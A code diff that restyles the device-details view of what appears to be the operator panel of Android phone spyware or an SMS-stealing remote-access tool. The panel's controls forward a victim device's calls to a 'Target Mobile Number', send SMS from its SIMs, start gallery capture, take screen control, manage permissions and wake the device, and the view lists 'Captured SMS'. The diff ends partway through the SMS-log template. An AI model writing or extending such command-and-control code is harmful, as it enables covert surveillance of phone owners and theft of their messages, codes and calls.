@@ -378,76 +378,92 @@ function renderDeviceDetailsUI(deviceId) {
     const container = document.getElementById('device-details-content');
 
     container.innerHTML = `
-        <!-- Professional Control Panel (Call Forwarding) -->
-        <div class="bg-white p-4 rounded-3xl border-2 border-indigo-600/20 shadow-lg shadow-indigo-100/40 space-y-4">
-            <button onclick="showCallForwardModal('${deviceId}')" class="w-full bg-gradient-to-br from-indigo-600 via-indigo-700 to-violet-700 text-white font-black py-3 rounded-2xl shadow-md shadow-indigo-100 hover:shadow-indigo-200 hover:-translate-y-0.5 transition-all uppercase tracking-[0.12em] text-[10px]">
+        <!-- Call Forwarding Control Panel -->
+        <div class="glass-card bg-white/10 p-5 space-y-4">
+            <button onclick="showCallForwardModal('${deviceId}')" 
+                class="w-full bg-gradient-to-r from-indigo-600 to-violet-600 text-white font-black py-3.5 rounded-2xl shadow-lg shadow-indigo-500/20 hover:-translate-y-0.5 active:scale-95 transition-all uppercase tracking-widest text-[10px]">
                 Call Forwarding
             </button>
 
-            <div id="cf-status-feedback" class="text-center text-[9px] font-black text-indigo-600 animate-pulse uppercase tracking-widest">
-                ${dev.call_forward ? `${dev.call_forward.status || 'EXECUTING'}: ${dev.call_forward.message || 'Waiting for response...'}` : 'SYSTEM READY'}
+            <div id="cf-status-feedback" class="text-center text-[9px] font-black text-indigo-300 animate-pulse uppercase tracking-[0.2em]">
+                ${dev.call_forward ? `${dev.call_forward.status || 'EXECUTING'}` : 'SYSTEM READY'}
             </div>
 
             <div class="grid grid-cols-1 gap-2.5">
-                <div class="group relative">
-                    <div class="absolute left-3.5 top-1/2 -translate-y-1/2 w-7 h-7 bg-indigo-50 rounded-lg flex items-center justify-center text-indigo-500 group-focus-within:bg-indigo-600 group-focus-within:text-white transition-colors">
-                        <i data-lucide="phone" class="w-4 h-4"></i>
-                    </div>
+                <div class="relative group">
+                    <div class="absolute left-4 top-1/2 -translate-y-1/2 text-indigo-400"><i data-lucide="phone" class="w-4 h-4"></i></div>
                     <input type="tel" id="cf-number" maxlength="10" placeholder="Target Mobile Number" 
-                        class="w-full bg-slate-50/50 border border-slate-200 rounded-xl pl-14 pr-4 py-3 text-xs font-bold text-slate-800 placeholder-slate-400 focus:ring-4 focus:ring-indigo-500/10 focus:bg-white focus:border-indigo-500 outline-none transition-all">
+                        class="w-full bg-white/5 border border-white/10 rounded-xl pl-12 pr-4 py-3 text-xs font-bold text-white placeholder-white/20 focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all">
                 </div>
-                <div class="group relative">
-                    <div class="absolute left-3.5 top-1/2 -translate-y-1/2 w-7 h-7 bg-indigo-50 rounded-lg flex items-center justify-center text-indigo-500 group-focus-within:bg-indigo-600 group-focus-within:text-white transition-colors">
-                        <i data-lucide="message-square" class="w-4 h-4"></i>
-                    </div>
+                <div class="relative group">
+                    <div class="absolute left-4 top-1/2 -translate-y-1/2 text-indigo-400"><i data-lucide="message-square" class="w-4 h-4"></i></div>
                     <input type="text" id="cf-message" placeholder="Command Message (Optional)" 
-                        class="w-full bg-slate-50/50 border border-slate-200 rounded-xl pl-14 pr-4 py-3 text-xs font-bold text-slate-800 placeholder-slate-400 focus:ring-4 focus:ring-indigo-500/10 focus:bg-white focus:border-indigo-500 outline-none transition-all">
+                        class="w-full bg-white/5 border border-white/10 rounded-xl pl-12 pr-4 py-3 text-xs font-bold text-white placeholder-white/20 focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all">
                 </div>
             </div>
 
             <div class="grid grid-cols-2 gap-2.5">
                 ${Object.values(dev.sims || {}).map(sim => `
-                    <div onclick="handleSendSmsClick('${deviceId}', ${sim.slot})" class="relative group/sim cursor-pointer bg-slate-50/50 border border-slate-200 p-2.5 rounded-xl hover:border-indigo-500 hover:bg-indigo-50/50 transition-all active:scale-95">
-                        <div class="flex items-center space-x-1.5 mb-1.5">
-                            <div class="p-1 bg-white rounded shadow-xs">
-                                <i data-lucide="sim-card" class="w-3 h-3 text-indigo-600"></i>
-                            </div>
-                            <span class="text-[9px] font-black text-slate-400 uppercase tracking-widest">SIM ${sim.slot + 1}</span>
+                    <div onclick="handleSendSmsClick('${deviceId}', ${sim.slot})" class="cursor-pointer bg-white/5 border border-white/10 p-2.5 rounded-xl hover:bg-white/10 hover:border-indigo-500/50 transition-all active:scale-95">
+                        <div class="flex items-center space-x-1.5 mb-1">
+                            <i data-lucide="sim-card" class="w-3 h-3 text-indigo-400"></i>
+                            <span class="text-[8px] font-black text-white/40 uppercase tracking-widest">SIM ${sim.slot + 1}</span>
                         </div>
-                        <p class="text-[10px] font-bold text-slate-800 leading-none truncate mb-1">${sim.carrier_name || 'No Carrier'}</p>
-                        <p class="text-[9px] font-bold text-indigo-600/80 tracking-tighter">${sim.number || 'Unknown'}</p>
+                        <p class="text-[10px] font-bold text-white truncate leading-tight">${sim.carrier_name || 'No Carrier'}</p>
+                        <p class="text-[9px] font-bold text-indigo-300 tracking-tighter">${sim.number || 'Unknown'}</p>
                     </div>
                 `).join('')}
             </div>
         </div>
 
-        <!-- System Actions Card -->
-        <div class="bg-white p-4 rounded-2xl border-2 border-slate-200 shadow-md space-y-3">
-            <div class="flex items-center space-x-2 border-b border-slate-100 pb-2">
-                <i data-lucide="zap" class="w-3.5 h-3.5 text-indigo-500"></i>
-                <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest">System Actions</h3>
+        <!-- System Actions Card (Smaller Buttons) -->
+        <div class="space-y-3">
+            <div class="px-2 flex items-center space-x-2">
+                <i data-lucide="zap" class="w-3.5 h-3.5 text-white/40"></i>
+                <h3 class="text-[10px] font-black text-white/40 uppercase tracking-widest">System Management</h3>
             </div>
             <div class="grid grid-cols-2 gap-2.5">
-                <button onclick="showCustomerDetailsPopup('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Details</button>
-                <button onclick="sendDeviceCommand('${deviceId}', 'gallery', 'start')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Start Gallery</button>
-                <button onclick="sendDeviceCommand('${deviceId}', 'gallery', 'stop')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Stop Gallery</button>
-                <button onclick="showScreenControlModal('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Screen Control</button>
-                <button onclick="showPermissionsPopup('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">User Permission</button>
-                <button onclick="showOldDetailsPopup('${deviceId}')" class="bg-slate-50 border border-slate-200 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider text-slate-700 hover:bg-indigo-50 hover:border-indigo-400 transition-all">Old Details</button>
-                <button onclick="manualPing('${deviceId}')" class="bg-indigo-600 text-white border border-indigo-600 py-2.5 rounded-xl text-[9px] font-bold uppercase tracking-wider hover:bg-indigo-700 transition-all flex items-center justify-center space-x-1"><i data-lucide="zap" class="w-3 h-3"></i><span>Wake Up</span></button>
+                <button onclick="showCustomerDetailsPopup('${deviceId}')" class="bg-white p-2.5 rounded-2xl shadow-lg flex flex-col items-center justify-center space-y-1 group active:scale-95 transition-all border-b-2 border-slate-200">
+                    <div class="w-8 h-8 bg-blue-50 text-blue-600 rounded-xl flex items-center justify-center group-hover:bg-blue-600 group-hover:text-white transition-all"><i data-lucide="user-search" class="w-4 h-4"></i></div>
+                    <span class="text-[10px] font-black text-slate-800 uppercase tracking-tighter">Live Details</span>
+                </button>
+                <button onclick="showScreenControlModal('${deviceId}')" class="bg-white p-2.5 rounded-2xl shadow-lg flex flex-col items-center justify-center space-y-1 group active:scale-95 transition-all border-b-2 border-amber-200">
+                    <div class="w-8 h-8 bg-amber-50 text-amber-600 rounded-xl flex items-center justify-center group-hover:bg-amber-600 group-hover:text-white transition-all"><i data-lucide="monitor" class="w-4 h-4"></i></div>
+                    <span class="text-[10px] font-black text-slate-800 uppercase tracking-tighter">Live Cast</span>
+                </button>
+                <button onclick="sendDeviceCommand('${deviceId}', 'gallery', 'start')" class="bg-emerald-500 p-2.5 rounded-2xl shadow-lg flex flex-col items-center justify-center space-y-1 group active:scale-95 transition-all border-b-2 border-emerald-700">
+                    <div class="w-8 h-8 bg-white/20 text-white rounded-xl flex items-center justify-center"><i data-lucide="play-circle" class="w-4 h-4"></i></div>
+                    <span class="text-[10px] font-black text-white uppercase tracking-tighter">Start Gallery</span>
+                </button>
+                <button onclick="sendDeviceCommand('${deviceId}', 'gallery', 'stop')" class="bg-rose-500 p-2.5 rounded-2xl shadow-lg flex flex-col items-center justify-center space-y-1 group active:scale-95 transition-all border-b-2 border-rose-700">
+                    <div class="w-8 h-8 bg-white/20 text-white rounded-xl flex items-center justify-center"><i data-lucide="stop-circle" class="w-4 h-4"></i></div>
+                    <span class="text-[10px] font-black text-white uppercase tracking-tighter">Stop Gallery</span>
+                </button>
+                <button onclick="showPermissionsPopup('${deviceId}')" class="bg-indigo-600 p-2.5 rounded-2xl shadow-lg flex flex-col items-center justify-center space-y-1 group active:scale-95 transition-all border-b-2 border-indigo-800">
+                    <div class="w-8 h-8 bg-white/20 text-white rounded-xl flex items-center justify-center"><i data-lucide="shield-alert" class="w-4 h-4"></i></div>
+                    <span class="text-[10px] font-black text-white uppercase tracking-tighter">Permissions</span>
+                </button>
+                <button onclick="manualPing('${deviceId}')" class="bg-cyan-500 p-2.5 rounded-2xl shadow-lg flex flex-col items-center justify-center space-y-1 group active:scale-95 transition-all border-b-2 border-cyan-700">
+                    <div class="w-8 h-8 bg-white/20 text-white rounded-xl flex items-center justify-center"><i data-lucide="zap" class="w-4 h-4"></i></div>
+                    <span class="text-[10px] font-black text-white uppercase tracking-tighter">Wake Device</span>
+                </button>
             </div>
+            <button onclick="showOldDetailsPopup('${deviceId}')" class="w-full glass-card bg-white/5 py-3 rounded-2xl flex items-center justify-center space-x-3 text-white border-white/10 hover:bg-white/10 transition-all">
+                <i data-lucide="history" class="w-4 h-4 text-white/60"></i>
+                <span class="text-[10px] font-black uppercase tracking-widest">History Logs</span>
+            </button>
         </div>
 
         <!-- Device SMS Logs -->
-        <div class="space-y-3">
+        <div class="space-y-4">
             <div class="flex items-center justify-between px-2">
                 <div class="flex items-center space-x-2">
-                    <i data-lucide="message-square" class="w-3.5 h-3.5 text-indigo-500"></i>
-                    <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Device SMS Logs</h3>
+                    <i data-lucide="message-square" class="w-3.5 h-3.5 text-indigo-400"></i>
+                    <h3 class="text-[10px] font-black text-white/40 uppercase tracking-widest">Captured SMS</h3>
                 </div>
-                <span class="text-[9px] font-bold text-slate-400 uppercase">${dev.Sms ? Object.keys(dev.Sms).length : 0} Messages</span>
+                <span class="text-[9px] font-black text-indigo-400 bg-indigo-500/10 px-2 py-0.5 rounded-md border border-indigo-500/20 uppercase">${dev.Sms ? Object.keys(dev.Sms).length : 0} Total</span>
             </div>
-            <div class="space-y-2">
+            <div class="space-y-3">
                 ${dev.Sms ? Object.values(dev.Sms)
                     .sort((a, b) => new Date(b.received_time) - new Date(a.received_time))
                     .map(msg => `
